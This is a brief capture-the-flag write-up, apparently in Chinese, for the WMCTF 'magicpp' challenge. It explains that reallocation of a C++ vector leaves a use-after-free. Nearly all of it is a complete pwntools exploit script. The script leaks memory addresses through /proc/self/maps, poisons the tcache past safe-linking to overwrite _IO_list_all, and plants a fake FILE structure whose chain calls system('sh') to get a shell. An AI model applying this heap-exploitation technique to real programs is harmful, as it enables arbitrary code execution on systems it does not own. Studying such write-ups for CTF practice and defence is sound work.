---
date: 2024-09-11 16:25
challenge: magicpp
tags:
  - cpp vector
---

Cpp 的 vector 在填满后会释放原先的内存，再申请两倍原先内存的空间，因此这道题就有 UAF：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def cmd(idx):
    sla(b"choice: ", i2b(idx))


def add(value, name, size, content=b"\x00"):
    cmd(1)
    sla(b"value: ", i2b(value))
    sa(b"name: ", name)
    sla(b"size: ", i2b(size))
    sa(b"context: ", content)


def delet(index):
    cmd(2)
    sla(b"index: ", i2b(index))


def load(name):
    cmd(4)
    sa(b"name: ", name)


def show(index):
    cmd(6)
    sla(b"idx: ", i2b(index))
    ru(b"value: ")
    value = int(rl())
    ru(b"book name: ")
    name = ru(b"\nContext: ", drop=True)
    context = ru(b"\nWelcome", drop=True)
    return value, name, context


sa(b"name: ", b"lian")
load(b"/proc/self/maps")
lines = show(1)[2].splitlines()
elf_base = int(lines[0].split(b"-")[0], 16)
for line in lines:
    if b"[heap]" in line:
        heap_base = int(line.split(b"-")[0], 16)
        break
for line in lines:
    if b"libc.so.6" in line:
        libc_base = int(line.split(b"-")[0], 16)
        break
delet(1)

add(0, b"exl", 0x3C0)
delet(1)

io_list_all = libc_base + 0x21B680

for i in range(0x17):
    lg("i", i)
    add(0, b"exl", 0xFFF)

_IO_wfile_jumps = libc_base + libc.sym._IO_wfile_jumps
_lock = libc_base + 0x21CA70
fake_IO_FILE = heap_base + 0x2A9C0

f1 = IO_FILE_plus_struct()
f1.flags = u64_ex("  sh;")
f1._lock = _lock
f1._wide_data = fake_IO_FILE + 0xE0
f1._mode = 1
f1.vtable = _IO_wfile_jumps

add(
    io_list_all ^ ((heap_base + 0x11EB0) >> 12),
    b"exl",
    0xFFF,
    flat(
        {
            0x00: bytes(f1),
            0xE0: {
                0x18: [0],
                0x30: [0],
                0xE0: [fake_IO_FILE + 0x200],
            },
            0x200: {0x68: [libc_base + libc.sym.system]},
        }
    ),
)

add(0, b"exl", 0x3C0, b"eastXueLian")
add(0, b"exl", 0x3C0, p64(fake_IO_FILE))

cmd(7)

lg("elf_base", elf_base)
lg("libc_base", libc_base)
lg("heap_base", heap_base)
ia()

# WMCTF{cpp_vect0r_1s_m4g1c_11111}
```
